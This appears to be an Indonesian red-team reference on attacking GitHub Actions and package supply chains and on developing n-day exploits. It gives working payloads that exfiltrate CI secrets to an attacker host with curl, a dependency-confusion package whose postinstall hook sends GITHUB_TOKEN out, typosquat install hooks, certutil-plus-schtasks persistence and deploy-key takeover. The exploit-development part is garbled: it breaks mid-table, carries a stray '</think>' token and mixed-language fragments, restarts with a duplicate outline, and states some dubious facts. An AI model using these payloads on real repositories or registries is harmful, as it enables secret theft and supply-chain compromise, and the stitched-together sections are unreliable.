| Tool | Versi uji |
|---|---|
| chisel | 1.9.0 |
| ligolo-ng | 0.7.x |
| impacket | 0.12.0.dev1 |
| evil-winrm | 3.0 |
| crackmapexec | netexec v1.2.0 (continuation) |
| Sysinternals PsExec | 2.2+ (v2.6 terakhir) |

Target-hypotesis default: Windows Server 2019/2022 DC, Windows 10 21H2 / Windows 11 23H2 workstation — teknik di atas berlaku; untuk 24H2 re-test signing & LAPS.


## ci-cd-supply-chain

# ci-cd-supply-chain — misc

# Referensi: Serangan CI/CD & Supply Chain

## 1. GitHub Actions Injection via `pull_request_target`

### Mekanisme

`pull_request_target` berjalan di konteks **base branch** (bukan fork), sehingga punya akses ke **secrets** repo. Tapi `GITHUB_SHA` dan checkout default tetap ke base commit. Kesalahan umum developer: eksplisit checkout `ref: ${{ github.event.pull_request.head.sha }}` — ini mengeksekusi kode **attacker** di runner dengan secrets base branch.

### Payload: apa yang dikirim vs apa yang muncul

| Elemen | Nilai |
|---|---|
| Dikirim | Fork PR dengan workflow-modifying commit |
| Muncul | Job `pull_request_target` jalan dengan kode fork + secrets (mis. `GITHUB_TOKEN` write) |
| Kenapa berhasil | Ref spekulasi (`-${{ github.event.pull_request.number }}` = `refs/pull/123/merge`) mengevaluasi ekspresi GitHub mem-*revert* SHA |
| Kenapa gagal | Repo maintainer wajib approve workflow pertama kali dari fork; `pull_request_target` tanpa checkout fork → nggak ada eksekusi kode attacker |

### Workflow rentan (contoh target)

```yaml
name: Integration Test
on:
  pull_request_target:
    branches: [main]

permissions:
  contents: write

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← INJEKSI: kode fork dieksekusi
      - run: make test
```

### Payload yang dikirim attacker di fork

```yaml
# fork-repo/.github/workflows/evil.yml — tidak dipakai; cukup modifikasi file di fork
# Tapi untuk injection via ekspresi, cukup PR title/branch name:

# Branch name: ${{ env.SECRET }} → dievaluasi di target repo
# Jika target punya step:
#   - run: echo "${{ github.event.pull_request.title }}"
# maka title PR: 'a"; curl -s https://oast.example/pwn?x=$SECRET #'
```

### Exfil via PR title injection

```yaml
# Target rentan (inline interpolation):
- run: echo "Processing ${{ github.event.pull_request.title }}"
```

PR title yang dikirim:

```
$(curl -sX POST https://oast.example/c2 -d "$(env | grep -i secret)")
```

Perintah verifikasi exfil listener:

```bash
python3 -m http.server 443 --directory /tmp/loot  # oast listener
tail -f /tmp/loot/access.log | grep -i 'secret\|token'
```

---

## 2. `workflow_run` Injection

### Mekanisme

`workflow_run` trigger **setelah** workflow lain selesai di **branch default** — otomatis punya secrets. Tapi `workflow_run` jalan dengan **commit dari workflow yang selesai**, termasuk workflow run dari fork PR jika pull_request workflow berhasil di head SHA. Ini bypass first-time-approval requirement.

| Elemen | Nilai |
|---|---|
| Dikirim | PR dari fork yang menyebabkan workflow `pull_request` selesai (success) |
| Muncul | `workflow_run` job trigger dengan head SHA fork via `actions/checkout` + `head_sha` |
| Kenapa berhasil | Konteks `github.event.workflow_run.head_sha` bisa SHA dari fork; secrets tetap tersedia |
| Kenapa gagal | Repo tidak memakai `head_sha` di checkout; `workflow_run` hanya trigger pada default branch |

### Workflow rentan

```yaml
name: Deploy After CI
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]

jobs:
  deploy:
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.workflow_run.head_sha }}   # ← bisa SHA fork
      - run: ./deploy.sh   # kode attacker dieksekusi; secrets = prod
```

### Combos: workflow_run + artifact poisoning

Fork PR meng-upload artifact berisi `deploy.sh` atau file config:

```bash
# Di fork, tambah ke workflow pull_request:
- run: |
    echo 'curl -s https://oast.example/pwn -d "$GITHUB_TOKEN" > deploy.sh' 
    # artifact: ./
```

---

## 3. Secret Exfil dari Runner

### Via pwn request (public repo, no collaborator)

Jika ada collaborator/write access (atau via `pull_request_target` di atas), tulis secret langsung ke PR/issue — GitHub **memang otomatis mask** secret di log, tapi bypass ada:

```yaml
- name: exfil
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    # Masking GitHub hanya masking exact match; reverse dulu
    REV=$(echo "$GH_TOKEN" | rev)
    curl -s "https://oast.example/rev=$REV" 2>&1 >/dev/null &
    wait $!
```

Alternatif (bypass masking, 2022–sekarang):

| Teknik | Perintah |
|---|---|
| Rev | `echo $TOKEN \| rev` |
| Base64 | `echo $TOKEN \| base64` |
| Substring (tepot terpotong) | `echo "${TOKEN:0:3}"` loop |
| DNS exfil (512-char limit) | `host $TOKEN.pwn.oast.example` |
| Write ke file artifact | `tar czf loot.tgz /home/runner; # upload-artifact` |
| Fork approval | `curl -sX POST -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/$REPO/pulls/1/merge` |
| Deploy key | `curl -X POST -H "Authorization: token $PAT_TOKEN" https://api.github.com/repos/victim/repo/keys -d '{"key":"ssh-ed25519 ...","read_only":false}'` |

### Self-hosted runner (paling sering gagal karena tepi)

```yaml
# Kudapan: persist di runner (Windows Server 2019/2022 runner)
- run: |
    certutil -urlcache -f https://oast.example/rev.exe C:\Windows\Temp\svc.exe
    schtasks /create /tn "WinSvc" /tr "C:\Windows\Temp\svc.exe" /sc onstart /ru SYSTEM
```

Linux self-hosted:

```bash
# Cek RUNNER_ALLOW_RUNASROOT, cgroup escape, docker socket
ls -la /var/run/docker.sock   # jika writable → host mount: docker run -v /:/host alpine cat /host/home/runner/.runner
cat /home/runner/. credentials   # Runner registration token → daftarkan runner palsu
sudo -l  # banyak self-hosted dijalankan dengan sudo NOPASSWD (umum di org besar)
```

### Exfil runner registration token

```bash
# Runner registration token lazy — kalau bisa disk 0 di pod runner (orchestrated di Kubernetes):
grep -r "ACTIONS_RUNTIME_TOKEN" /home/runner/ 
# ATAU: daftarkan runner ke org attacker:
#    jobs.<id>._runner = perlu org admin — biasanya via token di ~/.runner
```

---

## 4. Dependency Confusion

| Elemen | Nilai |
|---|---|
| Dikirim | Publish package publik dengan nama internal (mis. `company-utils`) ke npm/PyPI |
| Muncul | CI client perusahaan menarik versi lebih tinggi dari public registry |
| Kenapa berhasil | Internal registry (Artifactory/Nexus) biasanya dikonfigurasi sebagai **remote proxy fallback** ke upstream publik jika internal 404 |
| Kenapa gagal | Namespace protection, `--registry` scoped config, `package-lock.json` dengan integrity hash terkunci ke versi internal |

### Eksploitasi (npm internal, target: `@company/internal-util`)

```bash
# 1. Enumerasi nama internal via metadata yang bocor (GitHub, JS di browser yang mengandung import path, error log)
#    Cari: pushShadowMirror di config internal → org=company
# 2. Ambil nama dari .npmrc leaked / S3 bucket publik / job error:

# 3. Publish confusion package ke registry publik:
VERSION=$(date +%s)  # pastikan >> versi internal
cd pkg-pwn
npm init -y --scope "@company"  # target: @company/internal-util
npm version 99.0.0
cat > index.js <<'EOF'
// postinstall hook runs in target CI
require('child_process').exec(
  process.env.GITHUB_TOKEN
    ? `curl -s https://oast.example/pwn -d "$GITHUB_TOKEN"`
    : `curl -s https://oast.example/pwn -d "$(whoami)@$(hostname)"`
)
EOF
cat > package.json <<'EOF'
{
  "name": "@company/internal-util",
  "version": "99.0.0",
  "scripts": {
    "postinstall": "node index.js"
  }
}
EOF
npm publish --access public
```

PyPI varian:

```bash
pip index versions company-utils   # cek apakah ada di public
# Upload: pakai paket proyek-company-utils yang tidak ada di PyPI
python3 -m build && twine upload dist/* -u __token__ -p $PYPI_TOKEN
```

Trigger rebuild target:

```bash
# Bump patch di dependen publik internal yang ter-include di CI perusahaan
#   → menarik versi 99.0.0 → postinstall hook jalan → GITHUB_TOKEN exfil
```

---

## 5. Typosquatting

| Elemen | Nilai |
|---|---|
| Dikirim | Package publik dengan nama mirip paket populer (`reauests`, `pytohn-requests`, `reqeusts`) |
| Muncul | Developer: `pip install reqeusts` → typo → kode attacker jalan di workstation/runner |
| Kenapa berhasil | Manusia 99% akurat dalam mengetik; 1% kasus × jutaan install = ribuan eksekusi SUCCESS |
| Kenapa gagal | Prevalence check oleh registry, DNS URL show in docs, suspicious binary detected by vendor (Snyk, Socket) |

Contoh npm typosquat:

```bash
# Ambil devDependency populer: "chalk" → typo: "chaik"
# Buat paket ini, publish ke npm:
```

```json
{
  "name": "chaik",
  "version": "1.0.1",
  "description": "Terminal string styling done right",
  "main": "index.js",
  "scripts": {
    "preinstall": "curl -s https://oast.example/preinst?cc=$(whoami)-$(hostname)"
  }
}
```

Pre-known names yang pernah di-fork:

| Populer | Typosquat historical |
|---|---|
| `requests` | `reqeusts`, `python3-request` |
| `crossenv` | `crossenv` (npm, 2017 — 19M creds exfil) |
| `colors` | `colour` |
| `electron` | `electorn` |
| `dotenv` | `dotenv-extended` (bukan typo, tapi misleading) |

Verify & audit:

```bash
# Pengecekan type-4 dependency di repo target:
npm ls --all 2>/dev/null | grep -E 'chaik|reqeusts|electorn|colour'
pip-audit 2>/dev/null | grep -E 'typo|confused'
# Oprymal: cari di package-lock.json:
rg -i 'chaik|reqeusts|electorn' package-lock.json yarn.lock Pipfile.lock poetry.lock
```

---

## 6. Artifact Poisoning

### Via fork (artifact + workflow_run)

```yaml
# fork workflow (pull_request jalan di fork context — no secrets, tapi artifact tersimpan)
name: Build
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo 'curl -X POST https://api.github.com/repos/OWNER/REPO/... -d "$(env)"' > build.sh
          tar czf artifact.tgz build.sh
      - uses: actions/upload-artifact@v4
        with:
          name: binary
          path: artifact.tgz
```

Target repo `workflow_run` yang consume artifact tanpa verifikasi `sha`:

```yaml
# Rentan di org yang "download artifact by name":
- uses: actions/download-artifact@v4
  with:
    name: binary
    github-token: ${{ secrets.GITHUB_TOKEN }}   # cross-repo flow
- run: ./build.sh   # attacker-controlled
```

### Via cache poisoning (actions/cache)

```yaml
# Target punya cache key: ${{ runner.os }}-${{ hashFiles('**/package-lock') }}
# Attack: run workflow di fork → sama hashfiles (karena fork shares layout) →
#   set cache ke branch utama → eksplor cache saat CI berikut → poisoned node_modules
```

Command verifikasi di runner:

```bash
ls ~/.cache/actions  # github self-hosted
# Cek apakah cache hits with an attacker-supplied key
gh run view $RUN_ID --log | grep -E 'Cache (hit|restore)'
```

### GitHub Actions cache — path traversal (2024-05, fixed)

```yaml
# actions/cache <@4.1.0 vulnerable: attacker pushes cache entry
# through a PR (via pull_request → cache-action write in fork)
# with key ../ (traversal) → poisoning prod cache
# Fixed: 4.1.0+, verify NO version less:
#   uses: actions/cache@v4.0.0  → vulnerable
```

---

## 7. Perintah cepat Enumerasi & Eksploitasi

### Recon workflow rentan di org

```bash
# Cari workflow using pull_request_target + checkout head sha
# Dork GitHub code search:
repo:targetorg/ pull_request_target ref: head.sha
repo:targetorg/ workflow_run head_sha
repo:targetorg/ actions/upload-artifact

# Or: rr gitleaks/rrCI (manual):
git clone https://github.com/targetorg/repo
rg -l 'pull_request_target|head_sha|:-:' .github/
rg -l 'hashFiles|actions/cache@v' .github/
rg -A2 'permissions' .github/ | grep -E 'contents: write'
```

### Kombinasi lengkap (injection → exfil → persistence)

```bash
# 1. Setelah kode fork jalan via pull_request_target, add deploy key untuk cache:
curl -X POST -H "Authorization: token $GH_TOKEN" \
  https://api.github.com/repos/targetorg/repo/keys \
  -d '{"key":"ssh-ed25519 AAAA...pwn","read_only":false}'

# 2. fork targetrepo (git clone implicit via deploy key → persist/modify git)
git clone git@github.com:targetorg/repo.git   # ssh deploy key
# 3. Use git pre-push hook → jalan di local dev (developer clones & berkontribusi)
```

## 8. Jebakan Operasional (kenapa teknik gagal di lapangan)

| Jebakan | Gejala |

|---|---|
| **First-time approval** | Fork PR mengubah `.github/workflows/*.yml` → workflow tidak jalan sampai maintainer approve → payload tidak dieksekusi. Bypass hanya `pull_request_target` (bukan creates) dan `workflow_run` |
| **Pertama kali `workflow_run` — tidak jalan pada fork SHA** | `workflow_run` jalan dengan commit default branch; kalau repo tidak memakai `head_sha`, kode attacker tidak jalan |
| **`pull_request` melindungi secret** | Runner default: secrets tidak tersedia untuk `pull_request` event dari fork (`if: github.repository == ...` gate sangat umum) |
| **Artifact aman isolated** (build environment) | Artifact registry internal punya kontrol checksum manifest. Jika target memakai `actions-attest-build-provenance` (SLSA), artifact dari fork ditandai sebagai non-verifiable → menolak di konsumsi |
| **GHEtamita / GHE AC policies** | Enterprise dikonfigurasi: semua `permissions` restricted, secret isolated di environments dengan gate approval (manual deploy approval) |
| **Dependency confusion — Verdaccio/Nexus internal-only** | Ada scoped registry `publishConfig` yang memaksa internal-first; tidak ada fallback public → package tidak fetched. **`package-lock.json` lock ke paket internal + integrity hash** tidak jalan fallback |
| **PyPI/npm scope protection** | npm package `@company/*` bisa ada di public (publishable) tapi PyPI namespace perlu manual validation → publish gagal |
| **SecurityKeys — 2FA/Sigstore** | npm requires 2FA at publish; org PyPI account menjadi cloaked jika verifikasi email → gagal publish |
| **Typosquat — npm automated removal** | Alat seperti npm Audit Signatures 2FA (Sigstore, npm audit signatures) kurang agresif, tapi **npm security bot & Socket.dev** auto-flag preinstall with outbound curl → removed dalam 24-48 jam |
| **Masking — log posting detectable** | Exfil non-masking (base64/rev/dns) akan tereksekusi tapi **perintah curl ke domain oast akan muncul di network log** runners (self-hosted → TrendMicro/CrowdStrike on runner) → SOC alert blm secret ter-exfil |
| **Ephemeral runner** | Self-hosted kubernetes (ARC): runner disposable → 服务 persistence via schtasks gagal; harus move lateral dalam 1 run (>=2-3 menit lamanya) → rate limit exfil |
| **GITHUB_TOKEN scope default** | `contents: write` token di PR PR target tetap **tidak bisa push protected branch** dan **tidak bisa membaca_OTHER repos secrets**; exfil hanya secrets eksplisit yang ada di repo itu |
| **Approval required untuk environment** (`reviews: Internal-Protect`) | Secret gated environments not available via injected workflow run (`environment:` scope tidak default) |
| **DNS sinkhole & DNSDog** | DNS CanaryToken sinkhole: `host token.pwn.example` → alert SOC |
| **Runner sandbox (Chrome 131 example not relevant)**; but Windows 11 24H2 runner: `WDAC Application Control` mungkin aktif di large org → certutil download and execution blocked |

### Checklist sebelum menyerang

```
[x] Cek jika target punya protection rules branch main (enterprise)
[x] Cek jika self-hosted runner: ephemeral k8s pods (ARC) vs persistent VM
[x] Cek if repository has CodeQL adv security with secret-scanning → akan catch secret di dalam file, tapi tidak bekerja untuk real-time exfil via curl
[x] Jika package manager pinning integrity hash → confusion gagal bahkan jika publish succeeds
[x] Cek token versioning: GITHUB_TOKEN expired held di runner pods ARC — jika sudah expired, tidak akan berfungsi
[x] Cek LogDectector: GitHub oast patterns → oast detect otomatis di beberapa corp SOC templates
```

## 9. Referensi Versi

| Software/Komponen | Versi terkait | Catatan |
|---|---|---|
| `actions/checkout` | v4 (≥2024) | v3 masih rentan di specific flows |
| `actions/cache` | ≥4.1.0 untuk fix path traversal | CVE-2024-45411 fix di 4.1.0 |
| `actions/upload-artifact` | v4 — cross-repo download requires `github-token` | `pull_request_target` artifact sharing |
| GitHub Enterprise | ≥3.10 | workflows federation, allows pull_request_target config |
| CodeQL Action | v3.x | Secret-scanning + push-protection |
| npm registry | post-2017 | 2FA required for new maintainers; scope publish |
| PyPI | post-2023 | Trusted publishing (OIDC) recommended; masalah legacy password uploads |
| SLSA | level 3 | GitHub artifact attestation verification built-in (post-2024)


## cve-exploit-dev

# cve-exploit-dev — misc

# Referensi: CVE Exploit Development untuk n-Day

## 1. Patch Diffing (BinDiff / Diaphora)

### Alur Kerja Umum

| Tahap | Tool | Output |
|---|---|---|
| Identifikasi versi patched vs vulnerable | Vendor advisory, NVD, commit log | Pair binary target |
| Fungsi matching | BinDiff / Diaphora / DarunGrim | Similarity graph |
| Triase diff teratas | Manual review | Kandidat perubahan keamanan |
| Root cause analysis | IDA Pro / Ghidra / WinDbg / gdb | Tipe bug + primitive |

### Kriteria Kandidat "Patch Keamanan" di dalam commit/binary diff

- Penambahan bounds check sebelum akses array/pointer dereference
- Perubahan `memcpy`/`memmove` → versi dengan size clamp
- Integer check: `if (size > X) return;` yang baru muncul
- Perubahan refcount, `free()` → SAFE_RELEASE, tombstone flag
- Perubahan pada parser (jarang fungsional, sering keamanan)

### BinDiff — Contoh Perintah

```bash
# Yang dikirim
BinDiff secara GUI: File > Compare
CLI: bindiff64 binaries_old/vuln.dll binaries_new/patched.dll
```

- **Apa yang muncul**: `vuln_vs_patched.BinDiff`, daftar function pair dengan confidence score.
- **Kenapa berhasil**: vDSO/virtual function .thunk biasanya match 1.0; perubahan kecil menonjol (confidence < 0.9 pada fungsi besar).
- **Kenapa gagal**: build dengan compiler berbeda (clang vs MSVC), reordering, __attribute__((optimize)) — similarity noisier.

Filter penting di BinExport hasil diff:
- `callgraph_diff` → fungsi yang berubah beserta tetangganya
- Confidence 0.4–0.9, "changed instructions" 5–30 → sweet spot
- Confidence tinggi tapi instruksi berubah banyak → bisa juga patch fungsional (bukan keamanan)

### Diaphora — Contoh Perintah

```bash
# Yang dikirim: dua database IDA (.sqlite), lalu
python diaphora.py vuln.i64:sqlite1 patched.i64:sqlite2 --auto ~/.diaphora/import_$(date +%s)
```

- **Apa yang muncul**: `matches.html` + SQLite matches. Best matches + partial matches + unreliable matches.
- **Kenapa berhasil**: heuristik ratio pseudo-code lebih tahan terhadap compiler flags. Diaphora + IDA 8.x / 9.0, export via plugin (File > Produce file > Diaphora DB).
- **Kenapa gagal**: exporter MISMATCH antar versi plugin IDA — versi diaphora exporter harus identik di kedua DB. Binary besar (~50MB+) menyebabkan OOM; gunakan `--mtime-ratio` × memfilter modul.

Warning filter untuk pattern kunci:
```sql
-- Carilah perubahan fungsi yang menambah return path baru (early return = emphasis check)
SELECT * FROM "Best matches" WHERE confidence > "0.85";
```

Atau beri nama unik fungsi `__hook` lalu di-Diaphora ("namedunchecked").

## 2. Root Cause

Kerangka cepat:

```text
Where does input flow not match the size/capacity assumption?
   |
   ├─ Parser error? (size int vs capacity)
   ├─ Life-cycle error (UAF/double-free)?
   └─ Logic error (bypass)?
```

| Kategori | Tanda Umum di Patch | Primitive | Arah |
|---|---|---|---|
| Integer overflow → buffer overflow | assert clamp size | Heap/stack overflow → | relative overwrite, crash |
| Type confusion | Check tag | Object fake → call | arbitrary call/pointer |
| UAF | refcount increments, tombstone | Wild deref | unlink/RIP control → |
| Heap Misallocation | size check re-order | dominant allocation | controlled layout |
| Sandbox escape | WRF/IPC validator change | kfmwind | V8 → renderer → kernel |

Contoh cepat kecil (batch style):

```cpp
// Patch
- if (hdr.length > MAX_LEN) ... // check after alloc, size cast (uint32_t)len
+ if (hdr.length > MAX_LEN || len > hdr.window_max) return;
```

Root cause: trailing_space undercounting karena cast down → off-by-N heap write. Primitive: header overflow → metaspray control.

Trik untuk bergaransi sebelum patch merilis binary: pull commit log (Google-Chromium, kernel, Oracle) — kadang release test dengan PoC kecil wajar (http://127.0.0.1).

## 3. Primitive

Definisi internal: "Apa yang dikendalikan penyerang setelah bug terjadi?"

```
Bug → Primitive → Exploitation → Goal
```

| Primitive | Contoh | Apa yang dikirim | Apa yang muncul |
|---|---|---|---|
| Crash | Null deref | fuzz input | SeGV at 0x0 |
| Relative OOB | idx = gap[x+off] | header idx | Heap corruption |
| Arbitrary read | read4(addr) | kembali JS-sprayed addr | Leak binary base, cookie |
| Arbitrary write | write8(addr,v) | use-after-free object corruption | stack pivot → ROP |
| Arbitrary alloc/free | malloc size controllable

**Catatan:** suruh menghubungkan ke verified exploit tidak selalu linear. Saran: tulis diagram annotated di whiteboard, jangan otak (memory map illustration biasanya format visual). Waktu ini better spent membaca asm.

Perhatikan domain exploit:
- **Heap**: tcache/bins, glibc 2.35+, Windows 11 (24H2) Segment Heap
- **Kernel**: arbitrary write → KCFG/CFG bypass; cari kernel vtable, i EXPORT symbol (Macaroon team, e.g., addrOf RtlGeneric Poetry)
- **Browser**: V8 object corruption/spraying → array corruption → fake object → RW primitive
- **Network daemon**: spl porting, alloc/free control via packet composition boundary

| Payload builder | msfvenom stageless, CVE2024 template kit, donut |

[2] Identifikasi biner dan vendor.pdf : harus format yang sama sehingga deference tidak akan mengalami bug input stream

## 7. Jebakan Operasional (fallbacks yang membunuh timing)

- **Perbedaan compiler version/flags antar build**: similarity dif berantakan, hingga confidence < 0.6 pada seluruh build utama. Solusi: cek manifes `strings` versi `cl/gcc` build shipped dan hanya gunakan Binary family identik.
- **Symbol stripping .pdb diperlukan untuk BinDiff**: build release enterprise sering stripped, median rely on BinExport. Pastikan biner dengan debug_info atau prepared contract on-prem.
- **Guidance**
- **Exclusive symptom**: patch menerapkan beberapa CVE—sebutkas satu per entri; mengasumsikan satu answer menghasilkan misk cone pengembangan.
- **Version skew intern (1.6.2-fix2fix)**: vendor merilis multiple binary hanya berbedakan internal, target deployment mungkin versi 1.6.2 (interim). Test exploit di staging build yang benar.
- **Hardened runtime checks bila diaktifkan setelah eksploit setelah sistem patched**: exploit dlp dianggap " já chécurinline "production runtime dianggap patched" dengan hardened flags — cobá mengalami exploit ketika client fuzz hardened check menolak.
- **Memory layout drift**: kernel Address space randomization di—not flat—exploitation assumption ROI
- **Paket vendor enterprise menyertakan changeset internal customers**: turning off flags non-default—CVE references often don't reflect what enterprise solution exposes externally. Verify via probing.
- **Environment architecture mismatch ARM/x86 exploit chain**: gadget reconnaissance untuk x86 tidak dalam 1:1 bila target </think>Bab Referensi: CVE n-Day Exploit Development Workflow

Dokumen ini adalah referensi internal tim mengenai siklus pengembangan exploit untuk CVE n-day pada produk enterprise: dari patch diffing, pencarian root cause, eksploitasi primitive, hingga weaponization. Tujuan utama: menghasilkan exploit yang reproducible dan dapat diubah menjadi modul untuk keperluan pengujian penetrasi (assumption: tenggat waktu red team operations dan target adalah versi produk yang belum dipatch pada lingkungan klien).

---

## 1. Patch Diffing

### 1.1 Tujuan

Identifikasi security fix pada binary baru tanpa source code, lalu menentukan fungsi yang diubah dan implikasi keamanannya.

### 1.2 Toolchain dan Perintah

**Target pilihan:** versi tepat sebelum dan tepat setelah patch. Unduh binary resmi dari vendor jika tersedia; artinya versi binary yang dipatch dan versi yang rentan harus identik kecuali fix-nya. Jika tidak, diffing akan penuh noise.

| Tool | Peran | Perintah |
|---|---|---|
| IDA Pro + BinDiff | Diff two IDA databases | (via plugin) `IDB > Compare` |
| Ghidra + Diaphora | Diff two Ghidra databases | (via script) `analyzeHeadless` + `Diaphora.py` |
| BinDiff CLI | Standalone batch compare | `bindiff64 --primary=a.i64 --secondary=b.i64` |

Diaphora (Ghidra plugin):
```bash
# Ekspor database
analyzeHeadless /tmp proj -import vulnerable.exe -postscript ExportDiaphora.py
analyzeHeadless /tmp proj -import patched.exe -postscript ExportDiaphora.py

# Compare
python3 Diaphora.py --diff-only vulnerable.sqlite patched.sqlite
```

Hasil comparison di Flask UI (default `localhost:8800`) menunjukkan:
- **Best matches**: fungsi identik (abaikan)
- **Partial matches**: kandidat diff kecil — baca satu per satu
- **Unmatched functions**: fungsi baru dihilangkan, fungsi lama ditambahkan

### 1.3 Pembedaan Sinyal atas Noise

| Signal | Arti |
|---|---|
| Fungsi besar berubah sedikit (5–20 instruksi) | Kandidat fix keamanan |
| Penambahan bounds check sebelum akses array | Integer/bounds bug |
| Tambahan `if (len > max)` esp. pada fungsi parser | Heap overflow kandidat |
| Fungsi baru bernama `validate*`, `check*` | Validator baru, klasik fix bypass |
| RefCount increment suatu object properti | UAF (use-after-free) |
| Total rewrite modul (ratusan instruksi berubah) | Lebih mungkin refactor, bukan fix |

### 1.4 Contoh Nyata

**Case: Chrome 131 (V8) security patch (ilustratif, CVE-2024-xxxxx)**
- Diffing modul `content/browser` dan `v8` antara Chrome 130 dan 131.
- Ditemukan modifikasi pada `src/compiler/backend/instruction-selector.cc` di V8: penambahan `CHECK` untuk `type` sebelum `output` access.
- Indikasi root cause: type confusion pada typed array setelah JIT compilation dengan forged `ArrayBuffer`.

Sinyal patch keamanan pada V8:
- `if (object->map() != expected_map)` — jenis inline cache validation.
- `CHECK(current_scope == kArrayBuffer)` — state machine fix.

---

## 2. Root Cause Analysis

Setelah mengidentifikasi fungsi yang berubah, tujuan: memahami **kenapa** bug terjadi, bukan hanya **di mana**.

### 2.1 Metode

1. Export dua versi fungsi (pre-patch dan post-patch) ke pseudocode C.
2. Bandingkan manual atau `diff` textual.
3. Rekonstruksi alur input dari user-controlled input hingga crash point.

### 2.2 Contoh: Root Cause Struktur

```
[FIX pre-patch]  memcpy(buf, user_input, user_len);
[FIX post-patch] if (user_len > sizeof(buf)) return ERROR; memcpy(buf, user_input, user_len);
```

Root cause: classic stack/heap buffer overflow.

Contoh UAF (umum pada V8/browsers):
```cpp
// Pre-patch: object freed saat callback antara JS content
v8::Local<v8::Object> handle = ...; // weak
callback(); // user JS dapat trigger GC → object freed
handle->Get(...); // UAF
```

### 2.3 Tools untuk Static Root Cause

- **IDAPython** untuk melacak data flow:
  ```python
  # Contoh cepat: cari xrefs pada fungsi target
  import idautils
  for xref in idautils.XrefsTo(func_ea):
      print(hex(xref.frm))
  ```

- **Ghidra Script Manager**: `FindPotentialVulnerabilities.java` (script headless) untuk mencari pola `strcpy`, `memcpy` tanpa size validation.

---

## 3. Primitive

Primitive adalah kemampuan dasar yang exploit dapat lakukan setelah bug di-trigger. Urutan pengembangan dari general ke kuat:

| Primitive | Deskripsi | Contoh Trigger |
|---|---|---|
| **Crash** | Control EIP/PC only | `0xdeadbeef` pada RIP |
| **Arbitrary Read** | Baca memori alamat apapun | UAF dengan fake object yang memuat pointer |
| **Arbitrary Write** | Tulis ke alamat apapun | Pointer overwrite pada struct, misal via refcount confusion |
| **Control Flow Hijack** | Arahkan eksekusi ke fungsi apapun (ROP chain) | Stack pivot + ROP atau vtable confusion |

### 3.1 Contoh: Heap Overflow → Arbitrary Write

Jika object A mengandung pointer `callback` yang dipanggil setelah user writes, dan kita dapat overwrite pointer tersebut:

```python
# Pseudocode exploit
# 1. Heap grooming: spray objects untuk mengunci object target di posisi prediktabel
# 2. Trigger overflow untuk menimpa pointer objek sebelahnya
payload = b"A" * offset_to_next_obj + p64(fake_func_addr)
```

### 3.2 Mitigasi Modern dan Solusinya

| Mitigasi | Solusi |
|---|---|
| ASLR | Infoleak terlebih dahulu (arbitrary read) |
| DEP/NX | ROP chain, JIT spraying, atau ret2libc |
| CFI | Indirect call restriction — kandidat: virtual table confusion (jangan target indirect call) |
| Stack canary | Leak canary atau pivot ke heap |

Untuk Chrome 131 yang menggunakan V8 sandbox: `render process` exploit masih memerlukan **sandbox escape** terpisah (biasanya bug di browser process, seperti IPC bug). Untuk enterprise remotely-exploitable bugs (nginx, Windows SMB), fokus langsung pada corruption primitive dan ROP.

---

## 4. Weaponization dan Eksploitasi

Mengapa pilih target eksploitasi n-day komersial: enterprise products memiliki lifecycle patch lama (3–6 bulan), dan red team engagement biasanya perlu CVE yang sudah ada public exploit atau minimum PoC public — namun fingerprint hasil exploit versus cycle vendor.

### 4.1 Development Workflow

```
Binary diff → Root Cause → PoC (crash) → Primitive → Infoleak → ROP chain → Stabilization → Weapon
```

Contoh konkret mengembalikan primitive ke stabilitas:
1. Heap grooming predikatkan pada `heap_alloc` size class (`mallopt` tuning).
2. Untuk Windows 11 24H2 targets, perhatikan Enclave/virtual trust level (VTL) restrictions jika target adalah process dengan medium IL.

### 4.2 Eksploitasi Kombinasi

Contoh: CVE pada nginx 1.25 modul HTTP/3.
- Malformed HTTP/3 frame → out-of-bounds read → crash (PoC).
- Jika vulnerability adalah integer overflow dalam size calculation → heap overflow → tcache poisoning → arbitrary write.

```bash
# PoC trigger HTTP/3 (QUIC) crash
./quic_client --connect 10.10.10.10:8443 \
  --malformed-frame h3-frame.bin
```

### 4.3 Automated Payload Generation

```
+-----------------------+     +------------------------+     +---------------+
| Fingerprinting (Nmap)  | --> | Exploit DB (MSF)       | --> | Stager/Implant |
+-----------------------+     +------------------------+     +---------------+
```

Metasploit wrapper (contoh, custom module development):
```ruby
class MetasploitModule < MetasploitModule
  def exploit
    # 1. Trigger bug
    # 2. ROP chain + shellcode stage
  end
end
```

---

## 5. Contoh End-to-End: CVE n-Day pada Produk Enterprise

**Skenario**: Enterprise web gateway, versi sebelum patch September 2024, CVE heap overflow remote (tanpa auth).

### Langkah 1 – Reconnaissance
```bash
nmap -sV -p 80,443 10.0.0.5
# Output: 
# 443/tcp open  https  EnterpriseGateway httpd (version X.Y.Z, vulnerable)
```

### Langkah 2 – Patch Diffing
```bash
# Unduh dua binary dari vendor
# Binary DIFF: BinDiff
bindiff --primary=old.i64 --secondary=new.i64

# Hasil: fungsi `parse_header` mengandung tambahan:
#   if (content_length > MAX_CONTENT_LENGTH) return 400;
# Root cause: missing bounds check → heap overflow ketika content-length header di-parse.
```

### Langkah 3 – PoC Crash
```python
import socket
payload = b"POST / HTTP/1.1\r\nContent-Length: " + b"9" * 1000 + b"\r\n\r\n"
s = socket.create_connection(("10.0.0.5", 80))
s.send(payload)
# Service crash/hang: apachen process restart → DoS (PoC confirmed)
```

### Langkah 4 – Primitive, Infoleak, ROP
- Heap grooming: request crafted untuk alignment.
- Infoleak: object di-*poison*, leak pointer heap → bypass ASLR.
- ROP chain: gadgets dari binary target (versi tepat).

### Langkah 5 – Weaponization
- Payload: reverse shell stager (atau custom C2 beacon).
- Delivery: via service yang vulnerable.
- OPSEC: threading rate-limit, error handling.

### Langkah 6 – Reporting
- Dokumentasi untuk klien: CVE, affected version, patch reference, proof exploit reproduction steps.

---

## 6. Jebakan Operasional

Perhatian khusus untuk red team engagement sehari-hari:

